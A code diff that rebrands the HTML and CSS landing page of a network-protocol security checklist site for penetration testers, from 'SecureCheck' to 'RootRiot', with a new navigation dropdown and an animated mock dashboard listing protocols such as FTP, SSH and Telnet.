@@ -1,838 +1,750 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="scroll-smooth">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SecureCheck - Modern Protocol Testing Checklist</title>
-    <meta name="description" content="Track testing procedures and discover vulnerabilities & tools for network protocols with SecureCheck.">
+    <title>RootRiot - Network Protocol Security Checklist</title>
 
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" as="style">
-    <link rel="preload" href="https://cdn.jsdelivr.net/npm/boxicons@2.1.4/css/boxicons.min.css" as="style">
+    <!-- Preloading and Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link rel="preload" href="https://fonts.googleapis.com/css2?family=Manrope:wght@300;400;500;600;700;800&display=swap" as="style">
-
-    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@2.1.4/css/boxicons.min.css">
+    <!-- Fira Code for Monospace elements -->
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
 
     <style>
+        /* --- Core Variables (Matched to RootRiot Image) --- */
         :root {
-            --primary: #002F6C;
-            --primary-light: #1a56db;
-            --primary-dark: #001a3e;
-            --secondary: #10b981;
-            --secondary-light: #34d399;
-            --secondary-dark: #059669;
-            --dark: #0f172a;
-            --darker: #020617;
-            --light: #f8fafc;
-            --neutral: #64748b;
-            --glass-light: rgba(255, 255, 255, 0.05);
-            --glass-dark: rgba(0, 0, 0, 0.2);
-            --transition-fast: 0.2s ease;
-            --transition-medium: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            --transition-smooth: 0.4s cubic-bezier(0.33, 1, 0.68, 1);
-            --transition-spring: 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-            --shadow-sm: 0 2px 4px rgba(0, 0, 0, 0.1);
-            --shadow-md: 0 4px 8px rgba(0, 0, 0, 0.15);
-            --shadow-lg: 0 8px 16px rgba(0, 0, 0, 0.2);
-            --shadow-xl: 0 12px 24px rgba(0, 0, 0, 0.25);
+            --bg-darker: #02040a;
+            --bg-dark: #0b101b;
+            --bg-card: #111625;
+            
+            --accent-purple: #8b5cf6;
+            --accent-yellow: #fbbf24;
+            --accent-green: #10b981;
+            --accent-blue: #2563eb;
+            
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            
+            --glass-border: rgba(255, 255, 255, 0.08);
         }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Manrope', system-ui, -apple-system, sans-serif;
-        }
-
-        html {
-            scroll-behavior: smooth;
-            scroll-padding-top: 80px; 
-        }
-
+        /* --- Base Setup --- */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Manrope', sans-serif; }
+        
         body {
-            background: var(--darker);
-            color: var(--light);
-            min-height: 100vh;
+            background-color: var(--bg-darker);
+            color: var(--text-main);
             overflow-x: hidden;
-            background-image:
-                radial-gradient(circle at 10% 20%, rgba(26, 86, 219, 0.05) 0%, transparent 20%),
-                radial-gradient(circle at 90% 80%, rgba(16, 185, 129, 0.05) 0%, transparent 20%),
-                radial-gradient(circle at 50% 50%, rgba(15, 23, 42, 0.8) 0%, var(--darker) 100%);
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(37, 99, 235, 0.08) 0%, transparent 25%),
+                radial-gradient(circle at 90% 80%, rgba(139, 92, 246, 0.08) 0%, transparent 25%);
         }
 
-        .container {
-            width: 100%;
-            max-width: 1280px;
-            margin: 0 auto;
-            padding: 0 1rem;
-        }
-        @media (min-width: 640px) { 
-            .container {
-                padding: 0 1.5rem;
-            }
-        }
-
-        .glass-card {
-            background: rgba(15, 23, 42, 0.9);
-            border-radius: 16px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            box-shadow: var(--shadow-md);
-            transition: transform var(--transition-medium), box-shadow var(--transition-medium);
-            will-change: transform, box-shadow;
-        }
-
-        .glass-card:hover {
-            transform: translateY(-5px);
-            box-shadow: var(--shadow-lg), 0 0 15px rgba(26, 86, 219, 0.15);
+        /* --- Animated Hexagon Grid (Firewall Theme) --- */
+        .hex-grid {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            /* Hexagon pattern using gradients */
+            background-image: 
+                linear-gradient(30deg, #111 12%, transparent 12.5%, transparent 87%, #111 87.5%, #111),
+                linear-gradient(150deg, #111 12%, transparent 12.5%, transparent 87%, #111 87.5%, #111),
+                linear-gradient(30deg, #111 12%, transparent 12.5%, transparent 87%, #111 87.5%, #111),
+                linear-gradient(150deg, #111 12%, transparent 12.5%, transparent 87%, #111 87.5%, #111),
+                linear-gradient(60deg, rgba(255,255,255,0.02) 25%, transparent 25.5%, transparent 75%, rgba(255,255,255,0.02) 75%, rgba(255,255,255,0.02)),
+                linear-gradient(60deg, rgba(255,255,255,0.02) 25%, transparent 25.5%, transparent 75%, rgba(255,255,255,0.02) 75%, rgba(255,255,255,0.02));
+            background-size: 60px 105px;
+            background-position: 0 0, 0 0, 30px 52px, 30px 52px, 0 0, 30px 52px;
+            opacity: 0.3;
+            z-index: -1;
+            pointer-events: none;
+            /* Subtle pulse animation for the whole grid */
+            animation: gridPulse 8s ease-in-out infinite;
         }
 
-        .btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            padding: 0.75rem 1.5rem;
-            border-radius: 8px;
-            font-weight: 600;
-            transition: all var(--transition-medium);
-            cursor: pointer;
-            border: none;
-            outline: none;
-            text-decoration: none;
-            white-space: nowrap;
+        @keyframes gridPulse {
+            0%, 100% { opacity: 0.2; transform: scale(1); }
+            50% { opacity: 0.4; transform: scale(1.02); }
+        }
+
+        /* --- Components --- */
+        .glass-nav {
+            background: rgba(2, 4, 10, 0.85);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--glass-border);
         }
 
         .btn-primary {
-            background: var(--primary);
-            color: white;
-            box-shadow: 0 4px 6px rgba(0, 47, 108, 0.25);
-        }
-
-        .btn-primary:hover {
-            background: var(--primary-light);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 8px rgba(0, 47, 108, 0.3);
-        }
-
-        .btn-secondary {
-            background: var(--secondary);
-            color: white;
-            box-shadow: 0 4px 6px rgba(16, 185, 129, 0.25);
-        }
-
-        .btn-secondary:hover {
-            background: var(--secondary-light);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 8px rgba(16, 185, 129, 0.3);
-        }
-
-        .btn-outline {
-            background: transparent;
-            color: white;
-            border: 2px solid rgba(255, 255, 255, 0.2);
-        }
-
-        .btn-outline:hover {
-            border-color: var(--primary-light);
-            background: rgba(26, 86, 219, 0.1);
-            transform: translateY(-2px);
-        }
-
-        .gradient-text {
-            background: linear-gradient(to right, var(--primary-light), var(--secondary-light));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            display: inline-block;
-        }
-
-        .navbar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            padding: 1rem 0;
-            background: rgba(2, 6, 23, 0.8);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            z-index: 1000;
+            background: var(--accent-blue);
             transition: all 0.3s ease;
+            box-shadow: 0 0 20px rgba(37, 99, 235, 0.2);
+        }
+        .btn-primary:hover {
+            background: #1d4ed8;
+            box-shadow: 0 0 35px rgba(37, 99, 235, 0.5);
+            transform: translateY(-2px);
         }
 
-        .navbar.scrolled {
-            padding: 0.75rem 0;
-            background: rgba(2, 6, 23, 0.95);
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-        }
-
-        .feature-card {
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .feature-icon {
-            width: 56px;
-            height: 56px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 12px;
-            margin-bottom: 1.5rem;
-            background: rgba(26, 86, 219, 0.1);
-            box-shadow: 0 4px 8px rgba(0, 47, 108, 0.2);
-            flex-shrink: 0;
-        }
-
-        .testimonial-card {
-            padding: 2rem;
-            text-align: left;
-            position: relative;
-        }
-
-        .testimonial-card::before {
-            content: '"';
-            position: absolute;
-            top: 1rem;
-            left: 1.5rem;
-            font-size: 5rem;
-            line-height: 1;
-            font-weight: 800;
-            opacity: 0.1;
-            color: var(--primary-light);
-        }
-
-        .hero {
-            min-height: 90vh;
-            display: flex;
-            align-items: center;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .hero::before, .hero::after {
-            content: '';
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            z-index: -1;
-            pointer-events: none;
-        }
-        .hero::before {
-            background: radial-gradient(circle at 70% 50%, rgba(26, 86, 219, 0.10), transparent 50%);
-        }
-        .hero::after {
-             background: radial-gradient(circle at 30% 60%, rgba(16, 185, 129, 0.10), transparent 50%);
-        }
-
-        .app-mockup {
-    position: relative;
-    z-index: 10;
-    transition: all var(--transition-smooth);
-    will-change: transform;
-    border-radius: 12px;
-
-    border: none;
-    overflow: hidden;
-     background-color: transparent;
-}
-
-        .app-mockup img {
-            width: 100%;
-            height: auto;
-            display: block;
-            border-radius: 8px;
-        }
-
-        .fade-in {
+        /* Dropdown Styles */
+        .dropdown-menu {
             opacity: 0;
-            transform: translateY(20px);
-            transition: opacity 0.5s ease, transform 0.5s ease;
+            visibility: hidden;
+            transform: translateY(10px);
+            transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+            /* Added blur and semi-transparent background */
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            background-color: rgba(11, 16, 27, 0.95);
         }
-
-        .fade-in.visible {
+        
+        .group:hover .dropdown-menu,
+        .dropdown-menu.show {
             opacity: 1;
+            visibility: visible;
             transform: translateY(0);
         }
 
-        .features-list li {
-            margin-bottom: 1rem;
+        /* --- HERO: The Wave Animation --- */
+        
+        /* The Container */
+        .ui-float-container {
+            max-width: 900px;
+            width: 100%; /* Mobile fix */
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .app-interface {
+            background: var(--bg-darker);
+            border-radius: 16px;
+            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
+            overflow: hidden;
             display: flex;
-            align-items: flex-start;
+            height: 500px;
+            position: relative;
         }
 
-        .features-list i {
-            color: var(--secondary);
-            margin-right: 0.75rem;
-            flex-shrink: 0;
-            margin-top: 0.125rem;
+        /* Shimmer Effect overlay */
+        .app-interface::after {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%; width: 50%; height: 100%;
+            background: linear-gradient(to right, transparent, rgba(255,255,255,0.05), transparent);
+            transform: skewX(-25deg);
+            z-index: 20;
+            pointer-events: none;
+            animation: shimmerSweep 6s infinite;
         }
 
-        .pricing-card {
-            height: 100%;
+        @keyframes shimmerSweep {
+            0% { left: -100%; }
+            20% { left: 200%; }
+            100% { left: 200%; }
+        }
+
+        .mock-sidebar {
+            width: 240px;
+            background: var(--bg-dark);
+            border-right: 1px solid var(--glass-border);
+            padding: 24px;
             display: flex;
             flex-direction: column;
-            padding: 2.5rem 2rem;
-            position: relative;
-            overflow: hidden;
+            gap: 24px;
+            z-index: 2;
         }
 
-        .pricing-card.popular::before {
-            content: 'MOST POPULAR';
-            position: absolute;
-            top: 1.5rem;
-            right: -4rem;
-            background: var(--secondary);
-            color: white;
-            padding: 0.5rem 4rem;
-            font-size: 0.75rem;
-            font-weight: 700;
-            letter-spacing: 1px;
-            transform: rotate(45deg);
-        }
-
-        .pricing-card .price {
-            font-size: 3rem;
-            font-weight: 800;
-            margin: 1.5rem 0;
-            color: white;
-        }
-
-        .pricing-card .price span {
-            font-size: 1rem;
-            font-weight: 500;
-            color: var(--neutral);
-        }
-
-        footer {
-            background: rgba(2, 6, 23, 0.9);
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-            padding: 3rem 0 1.5rem;
-        }
-        @media (min-width: 768px) { 
-             footer {
-                padding: 4rem 0 2rem;
-            }
-        }
-
-        .mobile-menu {
-            position: fixed;
-            top: 0;
-            right: 0;
-            bottom: 0;
-            background: var(--darker);
-            width: 300px;
-            max-width: 80vw;
-            z-index: 1001;
-            padding: 1.5rem;
-            transform: translateX(100%);
-            transition: transform 0.3s cubic-bezier(0.65, 0, 0.35, 1);
-            box-shadow: 0 0 25px rgba(0, 0, 0, 0.15);
-            overflow-y: auto;
-        }
-
-        .mobile-menu.open {
-            transform: translateX(0);
-        }
-
-        .menu-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0, 0, 0, 0.5);
-            z-index: 1000;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.3s ease;
-        }
-
-        .menu-overlay.open {
-            opacity: 1;
-            pointer-events: all;
-        }
-
-        .category-badge {
-            display: inline-flex;
-            align-items: center;
-            padding: 0.35rem 0.75rem;
-            background: rgba(26, 86, 219, 0.1);
-            border-radius: 9999px;
-            font-size: 0.75rem;
-            font-weight: 600;
-            margin-bottom: 0.5rem;
-            border: 1px solid rgba(26, 86, 219, 0.2);
-            color: var(--primary-light);
-        }
-
-        .glow-btn {
+        .mock-content {
+            flex: 1;
+            padding: 32px;
+            background: var(--bg-darker);
             position: relative;
             z-index: 1;
         }
 
-        .glow-btn::after {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 150%;
-            padding-bottom: 150%;
-            background: radial-gradient(circle, rgba(26, 86, 219, 0.3) 0%, transparent 70%);
-            border-radius: 50%;
-            opacity: 0;
-            transition: opacity 0.5s ease, transform 0.5s ease;
-            transform: translate(-50%, -50%) scale(0.8);
-            pointer-events: none;
-            z-index: -1;
+        /* Sidebar Items */
+        .mock-search {
+            height: 40px;
+            background: rgba(255,255,255,0.03);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            gap: 10px;
+            color: var(--text-muted);
+            font-size: 13px;
+        }
+        
+        .mock-item {
+            padding: 10px; border-radius: 6px; font-size: 13px; color: var(--text-muted); display: flex; align-items: center; justify-content: space-between;
+        }
+        .mock-item.active { background: rgba(255,255,255,0.05); color: white; border-left: 3px solid var(--accent-green); padding-left: 7px; }
+
+        /* --- THE WAVE: Card Animations --- */
+        .mock-card {
+            background: var(--bg-card);
+            border-radius: 12px;
+            padding: 20px;
+            border: 1px solid var(--glass-border);
+            position: relative;
+            margin-bottom: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            /* Animation Base */
+            transform: translateY(0);
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
         }
 
-        .glow-btn:hover::after {
-            opacity: 0.7;
-            transform: translate(-50%, -50%) scale(1);
+        /* Wave Keyframes: Gentle float up and down */
+        @keyframes waveFloat {
+            0%, 100% { transform: translateY(0); box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); border-color: var(--glass-border); }
+            50% { transform: translateY(-6px); box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.3); border-color: rgba(255,255,255,0.15); }
         }
 
-        .dashboard-mockup {
-    position: relative;
-    border-radius: 12px;
-    overflow: hidden;
+        /* Staggered Animations */
+        .card-wave-1 { animation: waveFloat 4s ease-in-out infinite; animation-delay: 0s; }
+        .card-wave-2 { animation: waveFloat 4s ease-in-out infinite; animation-delay: 1.5s; } /* Offset to create wave */
+        .card-wave-3 { animation: waveFloat 4s ease-in-out infinite; animation-delay: 3s; }
 
-    background-color: transparent;
-}
+        .mock-card::before {
+            content: ''; position: absolute; left: 0; top: 16px; bottom: 16px; width: 4px; border-radius: 0 4px 4px 0;
+        }
+        .mock-card.purple::before { background: var(--accent-purple); }
+        .mock-card.yellow::before { background: var(--accent-yellow); }
+
+        /* Badges */
+        .badge { font-size: 10px; padding: 3px 8px; border-radius: 4px; font-weight: 700; text-transform: uppercase; margin-left: 10px; letter-spacing: 0.5px; }
+        .b-purple { background: rgba(139, 92, 246, 0.15); color: #c4b5fd; border: 1px solid rgba(139, 92, 246, 0.3); }
+        .b-yellow { background: rgba(251, 191, 36, 0.15); color: #fcd34d; border: 1px solid rgba(251, 191, 36, 0.3); }
+
+        /* --- Fade Entrance --- */
+        .fade-in-section { opacity: 0; transform: translateY(20px); transition: opacity 0.8s ease-out, transform 0.8s ease-out; }
+        .fade-in-section.is-visible { opacity: 1; transform: none; }
+
+        /* --- Dashboard Specific Styles --- */
+        .dash-stat-box {
+            background: rgba(11, 16, 27, 0.8);
+            border: 1px solid var(--glass-border);
+            border-radius: 8px;
+            padding: 12px;
+        }
+        .dash-label {
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #4b5563;
+            margin-bottom: 4px;
+            font-weight: 700;
+        }
+        .dash-value {
+            color: var(--text-main);
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .dash-code {
+            font-family: 'Fira Code', monospace;
+            font-size: 12px;
+            color: #e2e8f0;
+            background: rgba(0,0,0,0.3);
+            padding: 16px;
+            border-radius: 8px;
+            border-left: 3px solid var(--accent-green);
+        }
 
     </style>
 </head>
+<body class="antialiased">
 
-<body>
-    <nav class="navbar" id="navbar">
-        <div class="container">
-            <div class="flex items-center justify-between h-16">
-                <a href="#" class="text-2xl font-bold tracking-tight flex-shrink-0">
-                    <span class="text-primary-light">Secure</span>Check
-                </a>
+    <!-- Hex Grid Background -->
+    <div class="hex-grid"></div>
 
-                <div class="hidden md:flex items-center space-x-6 lg:space-x-8">
-                    <a href="#features" class="text-gray-300 hover:text-white transition-colors">Features</a>
-                    <a href="#benefits" class="text-gray-300 hover:text-white transition-colors">Benefits</a>
-                    <a href="#pricing" class="text-gray-300 hover:text-white transition-colors">Pricing</a>
-                    <a href="#faq" class="text-gray-300 hover:text-white transition-colors">FAQ</a>
+    <!-- Navigation -->
+    <nav class="glass-nav fixed w-full top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-20">
+                <div class="flex-shrink-0 flex items-center gap-2 cursor-pointer" onclick="window.scrollTo(0,0)">
+                    <span class="font-bold text-xl tracking-tight text-white">Root<span class="text-blue-500">Riot</span></span>
                 </div>
-
-                <div class="hidden md:flex items-center space-x-4">
-                    <a href="#" class="btn btn-outline text-sm px-4 py-2">Login</a>
-                    <a href="https://adityasingh1996.github.io/SecureCheck/SecureCheck" class="btn btn-primary text-sm px-4 py-2">Get Started</a>
+                <div class="hidden md:block">
+                    <div class="ml-10 flex items-baseline space-x-8">
+                        <!-- UPDATED: Checklist link now scrolls to #hero -->
+                        <a href="#hero" class="text-gray-400 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition-colors">Checklist</a>
+                        <a href="#features" class="text-gray-400 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition-colors">Features</a>
+                        <a href="#toolkit" class="text-gray-400 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition-colors">Toolkit</a>
+                        <a href="#scan-intelligence" class="text-gray-400 hover:text-white px-3 py-2 rounded-md text-sm font-medium transition-colors">Scan Tools</a>
+                    </div>
                 </div>
-
-                <button id="menuToggle" class="block md:hidden p-2 rounded-lg text-white focus:outline-none hover:bg-gray-800 transition-colors">
-                    <i class="bx bx-menu text-2xl"></i>
-                </button>
+                
+                <!-- UPDATED: Dropdown for App Launch -->
+                <div class="relative group">
+                    <button class="btn-primary text-white px-6 py-2.5 rounded-md text-sm font-bold tracking-wide shadow-lg whitespace-nowrap flex items-center gap-2 focus:outline-none">
+                        Launch App <i class='bx bx-chevron-down text-lg'></i>
+                    </button>
+                    
+                    <div class="dropdown-menu absolute right-0 mt-2 w-56 border border-gray-700 rounded-xl shadow-2xl overflow-hidden z-50">
+                        <a href="checklist" class="flex items-center px-4 py-3 text-sm text-gray-300 hover:bg-blue-600 hover:text-white transition-colors border-b border-gray-800">
+                            <i class='bx bx-list-check text-lg mr-3'></i>
+                            <div>
+                                <span class="font-bold block">Checklist</span>
+                                <span class="text-xs opacity-70 font-normal">Protocol Audit</span>
+                            </div>
+                        </a>
+                        <a href="toolkit" class="flex items-center px-4 py-3 text-sm text-gray-300 hover:bg-blue-600 hover:text-white transition-colors border-b border-gray-800">
+                            <i class='bx bx-wrench text-lg mr-3'></i>
+                            <div>
+                                <span class="font-bold block">Toolkit</span>
+                                <span class="text-xs opacity-70 font-normal">Cyber Utilities</span>
+                            </div>
+                        </a>
+                        <a href="exploitSuggester" class="flex items-center px-4 py-3 text-sm text-gray-300 hover:bg-blue-600 hover:text-white transition-colors">
+                            <i class='bx bx-bug text-lg mr-3'></i>
+                            <div>
+                                <span class="font-bold block">Exploit Suggester</span>
+                                <span class="text-xs opacity-70 font-normal">Scan Analysis</span>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                
             </div>
         </div>
     </nav>
 
-    <div class="menu-overlay" id="menuOverlay"></div>
-    <div class="mobile-menu" id="mobileMenu">
-        <div class="flex justify-between items-center mb-8">
-             <a href="#" class="text-2xl font-bold tracking-tight">
-                 <span class="text-primary-light">Secure</span>Check
-             </a>
-            <button id="menuClose" class="p-2 rounded-lg text-white focus:outline-none hover:bg-gray-800 transition-colors">
-                <i class="bx bx-x text-2xl"></i>
-            </button>
-        </div>
-
-        <div class="flex flex-col space-y-5">
-            <a href="#features" class="text-lg font-medium text-gray-300 hover:text-white transition-colors py-2">Features</a>
-            <a href="#benefits" class="text-lg font-medium text-gray-300 hover:text-white transition-colors py-2">Benefits</a>
-            <a href="#pricing" class="text-lg font-medium text-gray-300 hover:text-white transition-colors py-2">Pricing</a>
-            <a href="#faq" class="text-lg font-medium text-gray-300 hover:text-white transition-colors py-2">FAQ</a>
-
-            <div class="pt-6 border-t border-gray-800 space-y-4">
-                <a href="#" class="btn btn-outline w-full">Login</a>
-                 <a href="https://adityasingh1996.github.io/SecureCheck/SecureCheck" class="btn btn-primary w-full">Get Started</a>
-            </div>
-        </div>
-    </div>
-
-    <section class="hero pt-24 md:pt-28 lg:pt-32">
-        <div class="container">
-            <div class="grid grid-cols-1 lg:grid-cols-12 gap-10 md:gap-16 items-center">
-                <div class="lg:col-span-6 text-center lg:text-left fade-in" id="heroContent">
-                    <span class="category-badge mb-4">Protocol Security Testing</span>
-                    <h1 class="text-4xl sm:text-5xl lg:text-6xl font-extrabold mb-6 leading-tight">
-                        Secure Your Systems with <span class="gradient-text">Structured Checklists</span>
+    <!-- Hero Section -->
+    <!-- ADDED: id="hero" -->
+    <section id="hero" class="relative pt-28 pb-16 lg:pt-40 lg:pb-32 overflow-hidden min-h-screen flex items-center">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10 w-full">
+            <div class="grid lg:grid-cols-2 gap-12 lg:gap-16 items-center">
+                
+                <!-- Hero Text -->
+                <div class="text-center lg:text-left fade-in-section">
+                    <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-gray-800 bg-gray-900/50 backdrop-blur-sm mb-6">
+                        <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
+                        <span class="text-xs font-medium text-gray-400 uppercase tracking-wider">v2.0 Active</span>
+                    </div>
+                    
+                    <h1 class="text-4xl sm:text-5xl lg:text-7xl font-extrabold tracking-tight mb-6 leading-tight">
+                        <span class="text-white">Protocol Security</span><br>
+                        <span class="text-gray-500">Checklist</span>
                     </h1>
-                    <p class="text-lg sm:text-xl text-gray-300 mb-8 max-w-xl mx-auto lg:mx-0">
-                        Track testing procedures, discover vulnerabilities, and leverage tools for comprehensive network protocol security testing.
+                    
+                    <p class="mt-4 text-lg lg:text-xl text-gray-400 max-w-2xl mx-auto lg:mx-0 mb-8 lg:mb-10 leading-relaxed font-light">
+                        The ultimate companion for penetration testers. Track testing procedures, discover vulnerabilities, and access tools instantly.
                     </p>
-
-                    <div class="flex flex-col sm:flex-row items-center justify-center lg:justify-start space-y-4 sm:space-y-0 sm:space-x-4 mb-12">
-                         <a href="https://adityasingh1996.github.io/SecureCheck/SecureCheck" class="btn btn-primary glow-btn py-3 px-6 sm:px-8 text-base sm:text-lg w-full sm:w-auto">
-                            <i class="bx bx-rocket mr-2"></i> Get Started Free
+                    
+                    <div class="flex flex-col sm:flex-row gap-4 justify-center lg:justify-start">
+                        <!-- Updated Link to Checklist Tool -->
+                        <a href="checklist" class="btn-primary text-white px-8 py-4 rounded-lg font-bold text-lg flex items-center justify-center gap-2">
+                            Start Checklist
                         </a>
-                        <a href="#demo" class="btn btn-outline py-3 px-6 sm:px-8 text-base sm:text-lg w-full sm:w-auto">
-                            <i class="bx bx-play-circle mr-2"></i> Watch Demo
+                        <a href="#features" class="px-8 py-4 rounded-lg font-semibold text-lg flex items-center justify-center text-gray-400 hover:text-white border border-gray-800 hover:border-gray-600 transition-all">
+                            Learn More
                         </a>
-                    </div>
-
-                    <div class="flex flex-wrap justify-center lg:justify-start items-center gap-x-6 gap-y-4 sm:gap-x-8">
-                        <div class="text-center">
-                            <div class="text-2xl sm:text-3xl font-bold text-white">100+</div>
-                            <div class="text-xs sm:text-sm text-gray-400 uppercase tracking-wider">Protocols</div>
-                        </div>
-                        <div class="hidden sm:block h-10 w-px bg-gray-800"></div>
-                        <div class="text-center">
-                            <div class="text-2xl sm:text-3xl font-bold text-white">500+</div>
-                            <div class="text-xs sm:text-sm text-gray-400 uppercase tracking-wider">Test Procedures</div>
-                        </div>
-                        <div class="hidden sm:block h-10 w-px bg-gray-800"></div>
-                        <div class="text-center">
-                            <div class="text-2xl sm:text-3xl font-bold text-white">250+</div>
-                            <div class="text-xs sm:text-sm text-gray-400 uppercase tracking-wider">Security Tools</div>
-                        </div>
                     </div>
                 </div>
 
-                <div class="lg:col-span-6 relative fade-in mt-10 lg:mt-0" id="heroImage">
-                    <div class="app-mockup dashboard-mockup">
-                        <img src="https://raw.githubusercontent.com/adityasingh1996/SecureCheck/refs/heads/main/images/doggy.png" alt="SecureCheck Dashboard" class="rounded-lg">
+                <!-- Hero Visual: THE WAVE ANIMATION (HIDDEN ON MOBILE AGAIN) -->
+                <div class="hidden lg:block relative fade-in-section" style="transition-delay: 0.2s;">
+                    <div class="absolute inset-0 bg-blue-600/10 blur-[90px] rounded-full z-0 transform translate-y-10"></div>
+
+                    <div class="ui-float-container z-10">
+                        <div class="app-interface">
+                            <!-- Sidebar -->
+                            <div class="mock-sidebar">
+                                <div class="font-bold text-lg text-white mb-2">Root<span class="text-blue-500">Riot</span></div>
+                                
+                                <div class="mock-search">
+                                    <i class='bx bx-search text-gray-500'></i>
+                                    <span>Search protocols...</span>
+                                </div>
+                                
+                                <div class="flex flex-col gap-1 mt-4">
+                                    <div class="text-[10px] font-bold text-gray-500 mb-2 uppercase tracking-wide">Protocols</div>
+                                    <div class="mock-item active">
+                                        <span>Active Directory</span>
+                                        <div class="w-2 h-2 bg-green-500 rounded-full"></div>
+                                    </div>
+                                    <div class="mock-item"><span>AFP</span></div>
+                                    <div class="mock-item"><span>AJP</span></div>
+                                    <div class="mock-item"><span>AMQP</span></div>
+                                    <div class="mock-item"><span>AWS Services</span></div>
+                                </div>
+                            </div>
+
+                            <!-- Content -->
+                            <div class="mock-content">
+                                <h2 class="text-xl font-bold text-white mb-1">Protocol Security Checklist</h2>
+                                <p class="text-gray-500 text-xs mb-6">Track testing procedures and vulnerabilities.</p>
+                                
+                                <div class="mb-6">
+                                    <div class="text-[10px] font-bold text-gray-400 mb-2 uppercase">Filter by Category</div>
+                                    <div class="flex gap-2">
+                                        <div class="px-3 py-1 bg-blue-600 text-white rounded-full text-[10px]">All</div>
+                                        <div class="px-3 py-1 border border-gray-700 text-gray-400 rounded-full text-[10px]">Database</div>
+                                        <div class="px-3 py-1 border border-gray-700 text-gray-400 rounded-full text-[10px]">Remote</div>
+                                    </div>
+                                </div>
+
+                                <div class="flex flex-col">
+                                    <div class="mock-card purple card-wave-1">
+                                        <div>
+                                            <div class="flex items-center gap-2 mb-1">
+                                                <span class="text-base font-bold text-white">FTP</span>
+                                                <span class="text-[10px] text-gray-500 font-mono border border-gray-700 px-1 rounded">21</span>
+                                                <span class="badge b-purple">FILE</span>
+                                            </div>
+                                            <div class="text-[11px] text-gray-500">File Transfer Protocol.</div>
+                                        </div>
+                                    </div>
+
+                                    <div class="mock-card yellow card-wave-2">
+                                        <div>
+                                            <div class="flex items-center gap-2 mb-1">
+                                                <span class="text-base font-bold text-white">SSH</span>
+                                                <span class="text-[10px] text-gray-500 font-mono border border-gray-700 px-1 rounded">22</span>
+                                                <span class="badge b-yellow">REMOTE</span>
+                                            </div>
+                                            <div class="text-[11px] text-gray-500">Secure Shell protocol for remote login.</div>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="mock-card yellow card-wave-3">
+                                        <div>
+                                            <div class="flex items-center gap-2 mb-1">
+                                                <span class="text-base font-bold text-white">Telnet</span>
+                                                <span class="text-[10px] text-gray-500 font-mono border border-gray-700 px-1 rounded">23</span>
+                                                <span class="badge b-yellow">REMOTE</span>
+                                            </div>
+                                            <div class="text-[11px] text-gray-500">Legacy unencrypted protocol.</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
                     </div>
                 </div>
